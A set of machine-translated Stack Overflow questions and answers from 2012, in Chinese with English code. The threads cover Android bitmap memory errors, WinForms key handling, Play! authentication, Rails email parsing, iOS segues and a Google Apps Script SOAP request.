    background-repeat:no-repeat;
    background-position: center center; 
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
    width:100%;
    height:100%;
    position:fixed;
    left:0;
    top:0;
    z-index:-700;
    } 
```

所以我需要三个更多的png作为悬停图像，留在三个人身上。如果它不应该是流体，就没有问题。有没有办法用css做到这一点？我是一个 javascript 菜鸟，但如果有办法，请告诉我。我认为 3 个与背景大小完全相同并使用 CSS-Mask 的 png 将是一个解决方案，但即使 FF 也不支持，所以没有选择。有任何想法吗？

谢谢大家，原谅我的英语！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T00:07:31.577

而不是使用`background-size:cover`或`background-size:contain`使用全角 bg 图像：

*   将内容区域分成 3 列（每个人 1 列）。
*   对每列的宽度使用响应式设计或流体布局（或者如果需要，使用 JS 或 jQuery 来检测浏览器的宽度和高度并计算每列所需的宽度）。
*   在每列中添加一个超链接，使用`display:block; width:100%;`.
*   `width:100%; height:auto;`使用（默认图像和悬停图像）将一对 img 标签添加到超链接。
*   将 mouseover/mouseout 事件处理程序添加到每个超链接（使用 JS 或 jQuery），以切换隐藏的 img 标签。

使用列的优点是超链接热点将始终与每个图像的大小和位置相匹配（否则对于所有屏幕大小和方向可能很难做到这一点）。

# android - Android：BitmapFactory.decodeStream() 内存不足，400KB 文件和 2MB 可用堆

> ID：11820266
> 
> 赞同：68
> 
> 时间：2012-08-05T21:36:04.293
> 
> 标签：android, heap-memory

我的应用程序在源代码的以下行中遇到 OOM 错误：

```
image = BitmapFactory.decodeStream(assetManager.open(imgFilename)); 
```

就在导致应用程序因 OOM 错误而被终止的分配之前：

```
(...)
08-05 21:22:12.443: I/dalvikvm-heap(2319): Clamp target GC heap from 25.056MB to 24.000MB
08-05 21:22:12.443: D/dalvikvm(2319): GC_FOR_MALLOC freed <1K, 50% free 2709K/5379K, external 18296K/19336K, paused 58ms
08-05 21:22:14.513: D/dalvikvm(2319): GC_EXTERNAL_ALLOC freed <1K, 50% free 2709K/5379K, external 18296K/19336K, paused 101ms
08-05 21:22:14.903: I/dalvikvm-heap(2319): Clamp target GC heap from 25.073MB to 24.000MB
08-05 21:22:14.903: D/dalvikvm(2319): GC_FOR_MALLOC freed 0K, 50% free 2709K/5379K, external 18312K/19336K, paused 53ms
08-05 21:22:22.843: D/ddm-heap(2319): Heap GC request
08-05 21:22:22.963: I/dalvikvm-heap(2319): Clamp target GC heap from 25.073MB to 24.000MB
08-05 21:22:22.963: D/dalvikvm(2319): threadid=1: still suspended after undo (sc=1 dc=1)
08-05 21:22:22.963: D/dalvikvm(2319): GC_EXPLICIT freed 1K, 50% free 2710K/5379K, external 18312K/19336K, paused 116ms 
```

DDMS 报告了关于堆状态的类似情况：

```
Heap Size:  5.254 MB
Allocated:  2.647 MB
Free:   2.607 MB
%Used:  50.38%
#Objects    49,028 
```

单步越过这条线会导致 OOM 错误：

```
08-05 21:26:04.783: D/dalvikvm(2319): GC_EXTERNAL_ALLOC freed <1K, 50% free 2710K/5379K, external 18312K/19336K, paused 57ms
08-05 21:26:05.023: E/dalvikvm-heap(2319): 2097152-byte external allocation too large for this process.
08-05 21:26:05.163: I/dalvikvm-heap(2319): Clamp target GC heap from 25.073MB to 24.000MB
08-05 21:26:05.163: E/GraphicsJNI(2319): VM won't let us allocate 2097152 bytes
08-05 21:26:05.163: D/dalvikvm(2319): GC_FOR_MALLOC freed 0K, 50% free 2710K/5379K, external 18312K/19336K, paused 30ms
08-05 21:26:05.283: D/skia(2319): --- decoder->decode returned false 
```

1.  据报道，“imgFileName”引用的文件大小在 Windows 上小于 400K。那么为什么 BitmapFactory.decodeStream 会尝试分配 2MB 呢？
2.  当似乎有足够的可用空间时，为什么会出现 OOM 错误？

此应用程序面向 Android 2.2 及更高版本。

提前致谢！

* * *

## 回答 #1

> 赞同：91
> 
> 时间：2013-05-13T18:13:22.873

Android 库在加载图像方面并不那么聪明，因此您必须为此创建解决方法。

在我的测试中，`Drawable.createFromStream`使用的内存比`BitmapFactory.decodeStream`.

您可以更改配色方案以减少内存（RGB_565），但图像也会降低质量：

```
BitmapFactory.Options options = new BitmapFactory.Options();
options.inPreferredConfig = Config.RGB_565;
Bitmap bitmap = BitmapFactory.decodeStream(stream, null, options); 
```

参考：http: [//developer.android.com/reference/android/graphics/Bitmap.Config.html](http://developer.android.com/reference/android/graphics/Bitmap.Config.html)

您还可以加载缩放的图像，这将大大减少内存使用量，但您必须知道您的图像不会失去太多的质量。

```
BitmapFactory.Options options = new BitmapFactory.Options();
options.inSampleSize = 2;
Bitmap bitmap = BitmapFactory.decodeStream(stream, null, options); 
```

参考：http: [//developer.android.com/reference/android/graphics/BitmapFactory.Options.html](http://developer.android.com/reference/android/graphics/BitmapFactory.Options.html)

要动态定义 inSampleSize，您可能想知道图像大小以做出决定：

```
BitmapFactory.Options options = new BitmapFactory.Options();
options.inJustDecodeBounds = true;
bitmap = BitmapFactory.decodeStream(stream, null, options);
int imageHeight = options.outHeight;
int imageWidth = options.outWidth;

options.inJustDecodeBounds = false;
// recreate the stream
// make some calculation to define inSampleSize
options.inSampleSize = ?;
Bitmap bitmap = BitmapFactory.decodeStream(stream, null, options); 
```

您可以根据设备的屏幕尺寸自定义 inSampleSize。要获取屏幕大小，您可以执行以下操作：

```
DisplayMetrics metrics = new DisplayMetrics();
((Activity) activity).getWindowManager().getDefaultDisplay().getMetrics(metrics);
int screenWidth = metrics.widthPixels;
int screenHeight =metrics.heightPixels; 
```

其他教程： - [http://developer.android.com/training/displaying-bitmaps/load-bitmap.html](http://developer.android.com/training/displaying-bitmaps/load-bitmap.html) - [http://developer.android.com/training/displaying-bitmaps/index.html](http://developer.android.com/training/displaying-bitmaps/index.html)

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2012-08-05T21:47:59.377

有关更有效地加载大型位图的指南，请参阅此：

[http://developer.android.com/training/displaying-bitmaps/load-bitmap.html](http://developer.android.com/training/displaying-bitmaps/load-bitmap.html)

一个 400 KB 的图像文件很容易占用 5-10 MB 的 RAM。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-08-05T21:46:46.250

磁盘上文件的大小不一定与内存中文件的大小一致。文件很可能是压缩的，而解码时则不会。您需要在计算中考虑到这一点。

将图像的大小（宽 x 高）乘以图像的颜色深度，得到图像的内存大小。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-05T22:52:26.800

Basically you can resolve your issue by trying to scale your `Bitmap` and you'll see memory consumption reduced. To do it you can copy he method shown [here](https://stackoverflow.com/q/11785179/828728).

Also, there is a dedicated page at Android Developeres that could help you understand better how to load large Bitmaps. Take a look at the official [documentation](http://developer.android.com/training/displaying-bitmaps/load-bitmap.html).

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-01-04T12:13:47.047

虽然上述答案显然是正确的，但更好的做法是在不再使用ImageView 的 bitmap/src 属性时将其*显式设置为**null ，主要是在您的活动被破坏时。*任何其他重型资源（大文本、音频、视频）等也可能被取消。这确保了资源被立即释放，而不是等待 GC 收集。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-04-21T21:10:45.077

您可以尝试通过[Glide](https://github.com/bumptech/glide)库分配位图。Glide 使用最合适的方法（特定于您的设备和环境）将位图文件移植到图形层（ImageView）中。

好，易于：

```
Glide.with(getContext())
            .load(imageFile.getPath())
            .into(previewImageView); 
```

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2018-07-09T06:56:02.020

我使用以下方法解决**了 OutOfMemoryError问题**

```
private Bitmap downloadImageBitmap(String sUrl) {
        this.url = sUrl;
        bitmap = null;
                    try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            for (options.inSampleSize = 1; options.inSampleSize <= 32; options.inSampleSize++) {
                InputStream inputStream = new URL(sUrl).openStream();  
                try {
                    bitmap = BitmapFactory.decodeStream(inputStream, null, options);      
                    inputStream.close();
                    break;
                } catch (OutOfMemoryError outOfMemoryError) {
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return bitmap;
    } 
```

* * *

## 回答 #8

> 赞同：-3
> 
> 时间：2015-09-23T10:05:22.570

我将 insample 大小更改为 2。我的问题已解决。但请确保图像质量不会受到破坏。

# java - Netbeans 调试器无法调试具有特定类名的任何项目

> ID：11820268
> 
> 赞同：2
> 
> 时间：2012-08-05T21:36:49.613
> 
> 标签：java, netbeans

Netbeans 7.0 中的一些奇怪行为。表面上，当我创建一个类时出现了问题，因为现在无论我在哪个项目中，如果我在一个名为“gamesandbox.agents”的包中创建一个名为“RainbowBall”的类（即使我刚刚创建了新的包），它编译得很好，但是当我调用 RainbowBall 构造函数时，调试器给了我“线程主停止”。

从新创建的项目中剥离示例：

```
//RainbowTest.java
package rainbowtest;

import gamesandbox.agents.RainbowBall;

public class RainbowTest
{
    public static void main(String[] args)
    {
        RainbowBall r = new RainbowBall();
        System.out.println(r.toString());
    }
}

/*---------------*/
//RainbowBall.java
package gamesandbox.agents;

public class RainbowBall
{
 public RainbowBall() {};   
} 
```

同样，这编译得很好，但调试器的行为就像 RainbowBall 是一个无法解析的符号（“Thread Main Stopped at RainbowTest.java:10”）。

如果我使用*任何*其他类名（例如“RainbowBall2”）或*任何*其他包名，我不会收到此错误。它发生在新创建的项目和旧项目中，即使没有以任何方式使用外部库/jars/包。

我可能只是更改名称或尝试更新到最新的 NetBeans，但最好了解发生了什么。IDE 已经清楚地将类的名称存储在某个永久且与项目无关的地方，并且拒绝像某种恐同症一样与 RainbowBalls 一起工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T23:15:44.170

您给出的输出消息听起来像 NetBeans 认为类中有一个断点。不过，我不确定为什么它对每个项目都是全球性的。

# ruby-on-rails - 使用 Ruby on Rails 解析电子邮件正文

> ID：11820270
> 
> 赞同：1
> 
> 时间：2012-08-05T21:37:09.353
> 
> 标签：ruby-on-rails

如何使用 Ruby on Rails 仅解析电子邮件的正文？下面是我想出的。我已经深入到身体的主题，但我想要的只是身体。我试图在不使用 TMail 或基于电子邮件的库的情况下解析它。

**节目**

```
<p>Body: <%= @text.parse_body %></p> 
```

**控制器**

```
 def show
    @text = Text.find(params[:id])
  end 
```

**模型**

```
class Text < ActiveRecord::Base
  attr_accessible :email

  def text_input
      @raw_email = email.to_s
  end

  def parse_body
    @parse_email = @raw_email.match(/(\r\n\r\n[\W\w\S\s\D\d\b]*\r\n)/i)
    @parse_body = @parse_email.to_s.gsub(/<[\W\w\S\s\D\d\b]*?>/, "")
  end 
```

**结果@parse_email**

```
\r\n\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2//EN\">\r\n<HTML>\r\n<HEAD>\r\n<META   
HTTP-EQUIV=3D\"Content-Type\" CONTENT=3D\"text/html; =\r\ncharset=3Diso-8859-1\">\r\n<META  
NAME=3D\"Generator\" CONTENT=3D\"MS Exchange Server version 
=\r\n6.5.7654.12\">\r\n<TITLE>Test for long subject</TITLE>\r\n</HEAD>\r\n<BODY>\r\n<!-- 
Converted from text/plain format -->\r\n\r\n<P><FONT 
SIZE=3D2>Test<BR>\r\n<BR>\r\n</FONT>\r\n</P>\r\n\r\n</BODY>\r\n" 1:"\r\n\r\n<!DOCTYPE HTML 
PUBLIC \"-//W3C//DTD HTML 3.2//EN\">\r\n<HTML>\r\n<HEAD>\r\n<META HTTP-EQUIV=3D\"Content-
Type\" CONTENT=3D\"text/html; =\r\ncharset=3Diso-8859-1\">\r\n<META NAME=3D\"Generator\" 
CONTENT=3D\"MS Exchange Server version =\r\n6.5.7654.12\">\r\n<TITLE>Test for long 
subject</TITLE>\r\n</HEAD>\r\n<BODY>\r\n<!-- Converted from text/plain format --
>\r\n\r\n<P><FONT SIZE=3D2>Body<BR>\r\n<BR>\r\n</FONT>\r\n</P>\r\n\r\n</BODY>\r\n 
```

**@parse_body 的结果**

```
Body: Test for long subject Body 
```

**结果我想得到**

```
Body 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T23:49:04.160

您应该使用为您执行此操作的 gem，例如[mail](https://github.com/mikel/mail/)！你可以这样做：

```
mail = Mail.read(@raw_email)
mail.subject
mail.body 
```

等等。如果可能的话，最好避免在这种情况下编写自己的解析器！

注意：我猜你说你想避免使用邮件库，但为什么呢？这将有很大帮助。这个也是纯红宝石。

# c# - 为什么按 Ctrl+"+" 会在 TextBox 中产生哔哔声？

> ID：11820272
> 
> 赞同：3
> 
> 时间：2012-08-05T21:37:10.033
> 
> 标签：c#, winforms, keyboard-shortcuts, keyboard-hook

我正在使用`C#`并`Windows Forms`希望将其用作我的应用程序`Ctrl+"Oemplus"`的功能`key`。我使用a `German keyboard`，这个键位于字母P右侧的2个键（即“+”）。每当我同时按下此键`Ctrl`且焦点位于 a 时，`TextBox`我都会发出哔哔声。
当我切换到`US keyboard`布局（仍在使用 my `German keyboard`）时也会发生这种情况。这就是`] key`. 在地址栏中
按此键时也会发生同样的情况。`Internet Explorers`我的问题是：

1.  为什么这个组合键会在 TextBox 中产生哔哔声。
2.  如何避免蜂鸣声？

感谢您为此付出的任何努力。
更新：
我在美式/泰语键盘上试了一下，也听到了哔哔声。无论我使用什么逻辑键盘布局（德语、美国、泰语），都会发生这种情况。
哔声也发生在地址栏中的 Windows 资源管理器中，但不在搜索框中。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-05T22:48:58.217

当您按下该按键时，您希望发生什么非常不清楚。TextBox 毫无疑问，它会发出哔哔声！因为它可以看到用户正在尝试做一些特别的事情，但它不知道到底*是什么*。给你发出哔哔声的好理由。解决方案是在下一个片段的 //.. 注释中实现魔术。使用额外的代码在最后停止哔哔声：

```
 private void textBox1_KeyDown(object sender, KeyEventArgs e) {
        if (e.KeyData == (Keys.Control | Keys.Oemplus)) {
            // Invoke magic
            //...

            // Magic is done now:
            e.Handled = e.SuppressKeyPress = true;
        }
    } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-05T22:21:30.590

我认为正在发生的是文本框不允许使用组合键，因此您会收到错误消息。您可以通过此代码（使用 EN Windows 中的右括号键）测试组合键，它使用[SuppressKeyPress](http://msdn.microsoft.com/en-us/library/system.windows.forms.keyeventargs.suppresskeypress.aspx)来防止组合键被传递给底层控件以防止发出哔哔声。

```
private void textBox1_KeyDown(object sender, KeyEventArgs e)
{
    if (ModifierKeys == Keys.Control)
        if (e.KeyValue == 221) // You may need to determine this value for your keyboard layout.
        {
            textBox1.Text += " + "; // Handle the Key combination.
            e.SuppressKeyPress = true;  // Prevents key from being passed to underlying control
        }

} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-24T21:48:46.567

过了一段时间，我回来了。我发现对以前的解决方案不满意的是，每个 TextBox 都需要对我用于其他用途的每个“哔”键进行处理。当然，我可以将 TextBox 子类化，但对于具有这种行为的每个键，我仍然有两个地方可以更改（处理和哔声抑制）。

实际上我使用 Ctrl+'+' 作为命令键。我使用全局键盘挂钩来完成此操作，因为该操作应该适用于所有表单并影响所有表单。相反，我现在使用以下代码以基本形式处理此问题：

```
 // Avoid beep on Ctrl+'+' in TextBox.
    protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
    {
        Keys key = keyData & Keys.KeyCode;
        bool alt = keyData.HasFlag(Keys.Alt);
        bool shift = keyData.HasFlag(Keys.Shift);
        bool control = keyData.HasFlag(Keys.Control);
        if (key == Keys.Oemplus && !shift && control && !alt)
        {
            // Perform the action for Ctrl+'+'
            return true;
        }
        return base.ProcessCmdKey(ref msg, keyData);
    } 
```

对我来说，这似乎是处理命令键的“正确”位置和方式。哔声消失了，没有任何额外的处理，我不必担心额外的命令键是否会产生哔声。

当表单有菜单或工具栏时，这将由为菜单项定义的快捷方式自动处理。但是我的表单没有菜单或工具栏。

# java - 爪哇玩！2 - 身份验证没有意义

> ID：11820273
> 
> 赞同：0
> 
> 时间：2012-08-05T21:37:10.817
> 
> 标签：java, authentication, playframework-2.0

[这是Java Play](https://stackoverflow.com/questions/11816353/java-play-2-user-management-with-cookies)的后续行动！[2 - 使用 cookie 进行用户管理](https://stackoverflow.com/questions/11816353/java-play-2-user-management-with-cookies)

来自 zentask 示例

```
 public class Secured extends Security.Authenticator {

        @Override
        public String getUsername(Context ctx) {
            return ctx.session().get("email");
        }

        @Override
        public Result onUnauthorized(Context ctx) {
            return redirect(routes.Application.login());
        }

        // Access rights

        public static boolean isMemberOf(Long project) {
            return Project.isMember(
                project,
                Context.current().request().username()
            );
        }

        public static boolean isOwnerOf(Long task) {
            return Task.isOwner(
                task,
                Context.current().request().username()
            );
        }

} 
```

对我来说，这真的没有意义。

用户获得以下 cookie。例如“电子邮件=test@test.com”

如果我转到“安全”页面，zentask 只检查电子邮件是否不为空。这怎么可能是安全的？

会话的原因是为了减轻数据库的负担。但是通过这种方法，他必须不断检查用户是否有权访问受保护的页面。

对我来说，这真的没有意义。为什么会有getUsername函数？为什么返回类型是字符串？

我想做这样的事情：

*   用户登录并获得一个类似于“value=randomString”的cookie

*   例如，在缓存中保护用户 OBJECT`Cache.set(randomstring,userObject);`

*   现在，如果访问者回来，我检查他的随机字符串是否在我的缓存中，如果是，则检查现金中的用户对象是否有权在受保护的页面上。

我能够做到这一点，只是没有 @Security.Authenticated() 注释。

是否可以使用此注释来实现这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-06T06:04:37.273

它只是一个`sample`，没有别的。您无需在 cookie 中存储电子邮件。例如，您可以保存一些哈希来识别登录用户，或者进行一些其他匹配。

示例尽可能简单，将其更改为更复杂的场景取决于开发人员。

顺便说一句，当然所有 Play 的 cookie 都已签名，我真的怀疑您是否能够手动更改它。

# android - Android Spinner 在对话框中给出此错误 android.view.WindowManager$BadTokenException: Unable to add window

> ID：11820274
> 
> 赞同：0
> 
> 时间：2012-08-05T21:37:26.167
> 
> 标签：android, dialog, spinner

我需要在我的应用程序中显示一个对话框。在此对话框中有一个 Spinner。所以我使用这段代码来显示对话框并填充 Spinner：

```
public class setup4 extends Activity {

public List<String> materie = new ArrayList<String>();

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.setup4);

    Database d = new Database(this);
    SQLiteDatabase db = d.getWritableDatabase();
    Cursor cursor = db.rawQuery("select * from materie", null);
    if (cursor.moveToFirst()) {
        do materie.add(cursor.getString(1)); while (cursor.moveToNext());
    }
    db.close();
}

//On bottone setup 4
public void onSetup4bottone(View v)
{
    AlertDialog.Builder customDialog = new AlertDialog.Builder(this);
    customDialog.setTitle("Aggiungi ora scolastica");
    LayoutInflater layoutInflater = (LayoutInflater)getApplicationContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    View view=layoutInflater.inflate(R.layout.aggiungi_ora,null);
    customDialog.setView(view);

    Spinner spinner = (Spinner) view.findViewById(R.id.aggiungi_ora_materia);
    ArrayAdapter<String> adapter = new ArrayAdapter<String>(view.getContext(),android.R.layout.simple_spinner_item, materie);
    adapter.setDropDownViewResource(android.R.layout.simple_spinner_item);
    spinner.setAdapter(adapter);
    spinner.setOnItemSelectedListener(new OnItemSelectedListener() {
        public void onItemSelected(AdapterView<?> parentView, View selectedItemView, int position, long id) {
            String selected = (String) parentView.getItemAtPosition(position);
            Toast.makeText(
                    getApplicationContext(), 
                    "hai selezionato "+selected, 
                    Toast.LENGTH_LONG
                ).show();
        }

        public void onNothingSelected(AdapterView<?> parentView) {
            // your code here
        }

    });

    customDialog.show();
}
} 
```

微调器正确加载项目，但是当我单击它以更改值时，应用程序崩溃并出现此错误：android.view.WindowManager$BadTokenException: Unable to add window 我也找到了这个线程[Android Spinner Error : android.view.WindowManager$BadTokenException ：无法添加窗口](https://stackoverflow.com/questions/7609519/android-spinner-error-android-view-windowmanagerbadtokenexception-unable-to)，但我无法理解解决方案

**解决** 了 `LayoutInflater layoutInflater = (LayoutInflater)getApplicationContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);`

利用

`LayoutInflater layoutInflater = getLayoutInflater();`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:57:46.657

尝试在不同的上下文中添加您的窗口。

更换你的线路`ArrayAdapter<String> adapter = new ArrayAdapter<String>(view.getContext(),android.R.layout.simple_spinner_item, materie);`

与以下一个：

```
ArrayAdapter<String> adapter = new ArrayAdapter<String>(setup4.this /**Your activity_name.this*/,android.R.layout.simple_spinner_item, materie); 
```

让我知道它是否有效...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T21:58:39.827

在你的`spinner.setOnItemSelectedListener()`，不要打电话`getApplicationContext()`，而是写这个：

```
spinner.setOnItemSelectedListener(new OnItemSelectedListener() {
    public void onItemSelected(AdapterView<?> parentView, View selectedItemView, int position, long id) {
        String selected = (String) parentView.getItemAtPosition(position);
        Toast.makeText(
                setup4.this,     //<===THIS LINE IS CHANGED BY ME
                "hai selezionato "+selected, 
                Toast.LENGTH_LONG
            ).show();
    } 
```

# c++ - llvm jit 编译成二进制

> ID：11820278
> 
> 赞同：1
> 
> 时间：2012-08-05T21:38:22.143
> 
> 标签：c++, compiler-construction, binary, llvm, jit

是否有可能以某种方式编写生成 LLVM IR 代码的编译器，用户将对其进行 JIT 编译，并在内存中编译后将其作为二进制文件写入磁盘？

这个场景背后的想法是我不想编译 LLVM IR 代码并让用户立即执行它（由于 JIT 编译而导致性能较低）。但是我希望当用户第二次执行这个程序时它已经被编译了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T03:43:44.530

那么问题是如何在生成原生二进制文件时重用 JIT 生成的代码？我怀疑是否有 API 可以做到这一点，但记住 MC JIT 的工作原理，它可能相对容易实现。

但是从我的 POV 来看，最好在第二次运行时将 LLVM IR 编译为本机代码。

# c# - Codedom 编译器图标选项错误

> ID：11820279
> 
> 赞同：3
> 
> 时间：2012-08-05T21:38:27.070
> 
> 标签：c#, .net, filepath, codedom

我正在与 Codedom 合作，用自定义图标编译单个 Exes。

这是我用来指定图标文件的代码：

```
string temp;
temp = string.Format("/target:winexe /win32icon:{0}", testico);
cp.CompilerOptions = temp; 
```

testico 在这种情况下是一个字符串，指定图标所在的位置。

现在的问题是，上面的代码只有在文件路径中没有空格的情况下才有效。

因此，为了允许带有空格的文件路径，我将代码修改为：

```
string temp;
temp = string.Format("/target:winexe /win32icon:\"{0}\"", testico);
cp.CompilerOptions = temp; 
```

不幸的是，这不起作用。

有任何想法吗？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T21:42:50.903

尝试：

```
\"/win32icon:{0}\" 
```

引号围绕整个论点

# ruby-on-rails - 使用haml和ruby根据数据库中的值以编辑形式选择下拉菜单

> ID：11820280
> 
> 赞同：0
> 
> 时间：2012-08-05T21:38:26.857
> 
> 标签：ruby-on-rails, ruby, haml

我有一个使用haml的表单中的下拉菜单代码

```
= f.select :people, options_for_select(['Kid','Youth','Man','woman']) 
```

表单提交后，值存储在 db 中。现在在编辑表单中，我想要这个下拉菜单，其中包含根据数据库中存储的值选择的值。如何使用haml做到这一点

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:49:41.273

```
= f.select :people, options_for_select([your options here], selected: @variable.people) 
```

其中@variable 是您获得选项的对象的名称。

# iphone - Xcode 无法通过代码加载视图

> ID：11820281
> 
> 赞同：1
> 
> 时间：2012-08-05T21:38:45.540
> 
> 标签：iphone, xcode

我正在开发一个 iOS 应用程序并且遇到了一些困难。我正在使用情节提要并放置了一个以模式连接的按钮以启动另一个视图。该按钮效果很好。但是，按钮实际上只是一个占位符，实际上，我想要一些代码来启动新视图。我尝试了几种方法，所有这些方法看起来都很简单，但没有任何结果。有没有办法让我的代码激活我的按钮当前激活的 segue？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T00:03:27.363

我认为@ctrahey 的解决方案应该有效。尝试将 segue 从源视图控制器（不是按钮，而是包含它的 vc）拖到目标视图控制器，并确保将其类型设置为模态。

在这种情况下，我认为`sender == self`与`nil`不应该无关紧要。

但是，如果这不起作用，我对模态 vcs 的通常做法是不在 IB 中为它们绘制任何 segues。相反，我让模态 VC 在没有连接的情况下浮动在 IB 中，在属性检查器上给它一个“标识符”。然后我使用这样的代码：

```
// be sure to use the real name of your storyboard
UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"MainStoryboard" bundle:nil];

// use the identifier you assigned to the modal vc
MyModalViewController *newVC = [storyboard instantiateViewControllerWithIdentifier:@"MyModalViewController"];

// presentingVC might be self, if this code is inside a vc
[presentingVC presentModalViewController:newVC animated:YES]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T21:44:25.953

给你的 segue 一个标识符（在右侧检查器面板中），然后在视图控制器中（来自同一个故事板）执行：

```
[self performSegueWithIdentifier:@"YourSeguesIdentifier" sender:self]; 
```

# objective-c - 动画时UIButton没有响应

> ID：11820284
> 
> 赞同：4
> 
> 时间：2012-08-05T21:39:13.560
> 
> 标签：objective-c

由于某种原因，我的 UIButton 在动画时不会响应 UIControlEvents。这是我制作动画的方式：

```
[UIView beginAnimations:nil context:NULL];
[UIView setAnimationDuration:[duration intValue]];
[UIView setAnimationCurve:UIViewAnimationCurveLinear];
// change parent UIView's frame
[UIView commitAnimations]; 
```

当它到达结尾时，它会让我点击它......但不是在它制作动画时。顺便说一句，我正在使用 UIControlEventTouchUpInside。

谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-05T21:41:15.040

您应该设置`UIViewAnimationOptionAllowUserInteraction`动画选项

使用块动画更容易完成：

```
[UIView animateWithDuration:[duration intValue] options:UIViewAnimationOptionAllowUserInteraction animations^{
    //set parent UIView's frame
}]; 
```

# soap - 没有 wsdl 的谷歌应用脚 本肥皂客户端

> ID：11820285
> 
> 赞同：0
> 
> 时间：2012-08-05T21:39:26.800
> 
> 标签：soap, google-apps-script

我正在尝试从谷歌应用程序脚本访问 Numara Footprints Web 服务 API。Web 服务没有 wsdl，但方法有据可查。使用 Google Apps Script Soap Service 的所有示例都假定存在 wsdl 文件，这对于我的目的来说是不可启动的。所以我想改用 UrlFetchApp 。通过使用 Numara Footprints 提供的示例 php 代码，我确定了请求的外观，并在 google 应用程序脚本中编写了以下代码：

```
function sendHttpPost() {
var payload= '<?xml version="1.0" encoding="utf-8"?>' +
'<SOAP-ENV:Envelope'+
'xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"'+
'xmlns:ns1="MRWebServices"'+
'xmlns:xsd="http://www.w3.org/2001/XMLSchema"' +
  'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"' +
    'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"' +
      'SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'+
        '<SOAP-ENV:Body>'+
        '<ns1:MRWebServices__search>'+
        '<param0 xsi:type="xsd:string">ACCOUNT NAME</param0>'+
        '<param1 xsi:type="xsd:string">PASSWORD</param1>'+
         '<param2 xsi:type="xsd:string"></param2>'+
          '<param3 xsi:type="xsd:string">'+
"SELECT * from MASTER1 where mrid='16888'</param3>"+
           '</ns1:MRWebServices__search>'+
            '</SOAP-ENV:Body>'+
            '</SOAP-ENV:Envelope>';

var headers =
  {
   "SOAPAction" :encodeURIComponent("MRWebServices#MRWebServices__search")
           };

var options =
{
  "contentType": "text/xml; charset=utf-8",
  "method" : "post",
  "headers" : headers,  
  "payload" : payload
};
UrlFetchApp.fetch("http://FOOTPRINTS SERVER/MRcgi/MRWebServices.pl", options);
} 
```

此代码成功联系服务器并返回以下错误消息：

```
Request failed for http://FOOTPRINTS SERVER/MRcgi/MRWebServices.pl 
returned code 500\. Server response: 
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance" 
xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" 
xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:xsd="http://www.w3.org/1999/XMLSchema"
SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<SOAP-ENV:Fault>
<faultcode>SOAP-ENV:Client</faultcode>
<faultstring>Application failed during request deserialization: 
not well-formed (invalid token) at line 1, column 70, byte 70 at 
C:/FootPrints/bin/Perl/lib/XML/Parser.pm line 187 </faultstring>
</SOAP-ENV:Fault>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope> (line 40) 
```

我不知道有什么方法可以获取更详细的错误消息，也不知道问题出在哪里。我发送的 xml 是直接从完美运行的 PHP 代码复制而来的。

我想知道是否有人：

1.  可以看到上面的谷歌应用脚​​本代码有问题，或者
2.  可以告诉我当我没有 wsdl 文件时如何使用 Google Apps Script soap 服务或
3.  知道一种让 Web 服务返回更多错误详细信息的方法。

提前致谢。我到处寻找我能想到但没有找到答案的地方。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T06:17:27.237

上述代码中的有效负载 var 在 XML 元素之间需要空格。更正的代码（注意每行末尾的空格）：

```
var payload= '<?xml version="1.0" encoding="utf-8"?> ' +
'<SOAP-ENV:Envelope '+
'xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" '+
'xmlns:ns1="MRWebServices" '+
'xmlns:xsd="http://www.w3.org/2001/XMLSchema" ' +
  'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ' +
    'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" ' +
      'SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> '+
        '<SOAP-ENV:Body> '+
        '<ns1:MRWebServices__search> '+
